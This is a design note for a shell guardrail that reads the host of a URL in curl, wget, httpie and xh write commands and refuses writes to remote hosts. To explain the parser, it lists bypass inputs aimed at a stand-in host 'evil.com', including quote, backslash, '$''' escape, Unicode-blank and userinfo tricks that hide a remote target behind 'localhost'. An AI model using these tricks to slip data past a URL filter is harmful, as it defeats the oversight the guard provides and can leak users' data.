# Reading the host of a URL in an HTTP write

`_guardrails_has_remote_target` in `plugins/building/lib/publish-cmd.sh` decides
whether an HTTP write from `curl`, `wget`, httpie or `xh` goes to a host off this
machine. Loopback (`localhost`, a dotted `127.` address, `[::1]`, `0.0.0.0`) and
`.local` or `.localhost` names are development, not publishing. A host that may be
either asks, and every other host it finds is remote, and the write is refused.

## Hosts not proven local

The user decided that a write to a host not proven local asks, and that a public name
is refused, as before. `_guardrails_host_class` sorts each host into one of three:

| Class | Hosts | Write |
|---|---|---|
| Proven local | `localhost`, a dotted `127.` address, `[::1]`, `0.0.0.0`, a `.local` or `.localhost` name | allowed |
| Not proven local | a name with no dot (`api`, `intranet`), a name under `.internal`, `.lan` or `.home.arpa` (`host.docker.internal`), an address in 10/8, 172.16/12, 192.168/16, 169.254/16, 100.64/10 or fc00::/7, a host from a variable | asks |
| Remote | a name with a dot and a top-level name of letters, and every other host: a public address, another IPv6 address, `127.1`, a host with a character no name has | refused |

A variable or a substitution before the URL's path, as in `http://$HOST/x`,
`http://localhost:$PORT/x` or `http://$U@localhost/x`, can hold any host, an `@` or a
`/`, so it makes even a local host not proven local. A public name before one stays
remote: `http://evil.com:$PORT/x` is refused. A whole URL from a variable,
`curl -d x "$WEBHOOK_URL"`, asks too. A word that starts with `$` or a backtick is read
as one if it is not an option's value, so `-d "$BODY"` and `-u "$USER:$PASS"` ask
nothing. curl's options are read from the full list of those that take a value in curl
8.22, so `--max-filesize "$N"` asks nothing either; `--url`'s value is the URL, and an
option curl adds later reads its value as a URL from a variable, which asks. curl's `--resolve` and `--connect-to` send the write for the URL's host to
another, so a write with either asks unless its URL is remote. A write through curl's proxy (`-x`, `--proxy`,
`--preproxy` or a `--socks` option) goes to the proxy, so its host is read as a URL's is,
with `http://` before it if it has no scheme: `-x proxy:3128` asks. curl's `-K` (`--config`)
and wget's `-i` (`--input-file`) read URLs from a file the guard cannot see, so a write
with one asks the same way.

A public address is remote, as the ranges above are the only private ones the user
named. The user added 100.64/10, which Tailscale and carrier-grade NAT use. An address with no scheme is read as a host, as a dotted name is, and asks only
if it is private. Of a word with no scheme, only a host that starts the word asks, as such
an address or `host.docker.internal:8080/api` does: a name with no dot or a variable after
userinfo there, as in `a.local@api`, was refused before and still is.

## Writes

`_guardrails_http_writes` decides whether the command is a write. It reads the words
as the client does, past redirects and with their quotes dropped, and each client by
its own options:

- **curl:** a body option (`-d` and the `--data` forms, `--json`, `-F`, `--form`,
  `--form-string`, `-T`, `--upload-file`), or a write method after `-X` or
  `--request`. A cluster of short options is read as curl reads it: flags, then one
  that takes a value, attached or as the next word. So `-sd x` and `-XPOST` write, and
  `-od` writes the response to the file `d`. `-G` (`--get`) sends the data of `-d` and the
  `--data` forms as a query string in a GET, so with only those it reads; `--json`, a
  form, an upload or a write method still writes.
- **curl's mail:** a mail recipient (`--mail-rcpt`), or a write to an `smtp://` or
  `smtps://` URL, sends mail as you, so it is refused whatever the host, as a mail tool
  such as `sendmail` is: a mail server on this machine relays it on.
- **wget:** `--post-data`, `--post-file`, `--body-data`, `--body-file`, a write method
  after `--method`, or a wgetrc command run with `-e` that does the same. wget reads a
  command's name in any case and without its `_` and `-`, so `-e Post-Data=x` writes.
- **httpie and xh:** a write method as the first argument, a raw body (`--raw`), a
  redirect of stdin, or a data item after the URL. An item sends data when its first
  separator is `=`, `:=`, `@`, `=@` or `:=@`, not a `==` query or a `:` header. The
  first argument is the method if it is letters only, as httpie and xh read it, so
  `http example.com text=hi` is a POST.

**Words that never name the host.** The host check reads every word after the client
but a redirect and its target, and the value of an option that never names the host:
curl's `-o`, `-D`, `-c` and `-H` (`--output`, `--dump-header`, `--cookie-jar`,
`--header`), wget's `-O` (`--output-document`) and `--header`, and httpie's and xh's
`-o` (`--output`). So `curl -d x localhost:3000 -o out.json` no longer reads
`out.json` as a remote host. A quoted value is one word, so `-H 'Authorization:
Bearer ab.cd.ef'` is skipped whole. The user chose this narrow list: every other
option's value is still read, so a dotted name in a body, as in `-d evil.com`, still
reads as a host.

One regex over the segment read every client's flags as curl's, so it missed `-sd x`,
`-dx`, a quoted `"-d"` and a redirect between `-X` and its method. It also read
httpie's `-d` (`--download`) and `-F` (`--follow`), and wget's `-d` (`--debug`), as
bodies.

## Problem

The check read the command as written. The client reads the word that the shell
passes it, and it parses that URL by its own rules. Two gaps let a remote write
through:

- **Quotes and backslashes (#148).** The shell drops them, but the URL patterns did
  not match across them. `curl -d x 'evil.com'`, `"http://e"vil.com/x` and
  `'h'ttps://evil.com` read as no URL at all.
- **Userinfo (#149).** `http://localhost:3000@evil.com` goes to `evil.com`, but
  the host was cut at the first `:`, so it read as `localhost`.

## Design

**Bytes.** A segment that holds a quote, a backslash or a byte outside ASCII is read
with `LC_ALL=C`. The shell splits words on ASCII blanks only. In a UTF-8 locale
`[[:space:]]` also matches U+3000 and U+00A0, so `http://localhost<U+3000>@evil.com`
ended at the blank and read as `localhost`, while curl sends it to `evil.com`.
Dropping quotes in a UTF-8 locale is also slow: 64,000 quotes in one word took the
guard 4.4 s, against 1.5 s as bytes (#134). Other text keeps the user's locale, where
the URL walk is faster.

**Quotes.** A segment that holds a quote or a backslash is split into words. Each
word that holds one is read as the shell passes it: its quotes, and the `$` of `$''`
or `$""`, are dropped. The URL walk then reads the result. So the #135 rule, that a
quote which closes a URL is not part of its host, needs no code of its own: the quote
is gone before the host is read.

**Backslashes.** Outside quotes the shell drops a backslash, so dropping it is exact.
In quotes it stays, and the clients disagree about it: a WHATWG parser (`xh`) and
urllib3 (httpie) end the host at it, while curl keeps it in the userinfo. So
`'http://evil.com:1\@localhost'` goes to `evil.com` with `xh` and to `localhost`
with curl. In `$''` an escape such as `\x40` or `\x2f` makes any character, so it
can hide an `@`, a `/` or a dot. The guard cannot cheaply tell which backslashes
stay. So a word with a backslash is remote if it holds a URL once its quotes and
backslashes are dropped, and a word that holds both a backslash and `$'` is remote
whatever it holds.

**Userinfo.** The host follows the last `@` before the first `/`, `?` or `#`, and
ends at a `:`. curl 8 takes the first `@` and refuses a host that holds another, and
Python's `urlsplit` and WHATWG parsers take the last. So no client reaches a host
before the last `@`. The walk finds a URL with userinfo through its own pattern,
`https?://[^[:space:]/?#]*@[^[:space:]]*`, which runs to a blank as the other scheme
patterns do. A host is read from the URL's whole word, as a match for a dotted name
stops before an `@`: `a.local@evil.com` goes to `evil.com`.

**Scheme.** curl reads `HTTP://` and `Https://` as `http://` and `https://`, so the
URL patterns match a scheme in any case. A WHATWG parser, as in xh, reads any number
of slashes after `http:` or `https:`, none included, so `http:evil.com` and
`http:/evil.com` go to `evil.com`. So a word that starts with the scheme and its colon
is a URL, and its host follows the slashes. curl also uploads over other schemes, as in
`curl -T f ftp://evil.com/` or an IMAP upload, and publishes over MQTT, so a URL with any
scheme and `://` is read the same way, its host sorted as an HTTP one is.

The 32-URL bound and the walk that finds URLs as `grep -o` does (#126) are as they
were. What the new reading costs is in the timing section of
[git-command-parsing.md](git-command-parsing.md#reading-in-time).

## What was rejected

- **Skipping the value of every option.** It would need each client's full table of
  options that take a value, over 150 for curl, and a value the table misses would
  hide a host. The user chose to skip only the values that never name one. curl's
  full table is now kept, but only to tell a value from the URL: each value is still
  read for a host.
- **Any URL with an `@` is remote.** It is simpler, but it refuses
  `http://admin:pass@127.0.0.1:5984/db`, a usual local form for CouchDB and
  Elasticsearch.
- **`_guardrails_unquote` as it is.** It reads 64 characters at most, so a long
  quoted local URL with a query string read as remote. It also drops every
  backslash, so `$'http://localhost\x40evil.com\x2fa.local'` reads as the local
  name `localhostx40evil.comx2fa.local`, while curl sends it to `evil.com`.
- **One substitution over the whole segment.** It is quadratic in the number of
  quotes (0.2 s for 64,000 of them), and it cannot tell which word a backslash is
  in.
- **Two readings of a backslash, dropped and as a slash, remote if either is.**
  A word that mixes a dropped backslash and a kept one defeats both:
  `http://localhost\.evil.com'\'@a.local` reads as local both ways, and `xh` sends it
  to `localhost.evil.com`.

## Known limitations

- **A URL with no scheme and with userinfo,** such as `curl -d x user@evil.com` or
  `localhost:3000@evil.com`, is not found. `-F file=@photo.jpg`,
  `-d email=me@example.com` and a JSON body with an e-mail address have the same
  shape, and the guard does not parse curl's options, so it cannot tell a URL from
  data there.
- **A URL with no scheme whose host has no dot,** as in `curl -d x api:8080/x`, is
  not found, for the same reason: it looks like `-d x`.
- **A scheme URL inside a word,** not at its start, is found only as before: after
  userinfo, bracketed, at `localhost` or `127.`, or at a dotted name. The client takes
  its URL from a whole word, so such a URL is data, as in `-d cb=http://intranet/x`.
- **A pipe into httpie or xh** sends what it reads as the body, as a redirect of stdin
  does, but the guard reads each command of a pipeline alone, so `echo hi | http
  example.com` is not read as a write.

- **A curl config file's own options,** as a `--data` or a URL in the file `-K` reads,
  are not seen: a write on the command line with `-K` asks, but `curl -K cfg` alone,
  whose file may hold the write, is read as a read. The same holds for wget's `--config`
  and its `-e` commands that name no body or method.
- **curl's `--dns-servers` and `--doh-url`** resolve the URL's name elsewhere, so a
  `.local` name may reach another host; they are read as any option's value, not as
  `--resolve` is.

## Failure mode if you change this

- Drop backslashes without the remote rule, and a `$''` escape or a kept backslash
  hides a remote host.
- Take the host after the first `@`, and `http://u@localhost@evil.com` reaches
  `evil.com` through httpie or `xh`.
- Read in the user's locale, and a Unicode blank ends a word that the shell does not
  end.
- Read a host a variable can change as proven local, and `http://localhost:$PORT`
  reaches whatever host `$PORT` holds after an `@`.
- Keep the reader's words with a slice of the toks array, which bash walks from its
  start, and a long write takes the guard past its timeout, which lets it through.
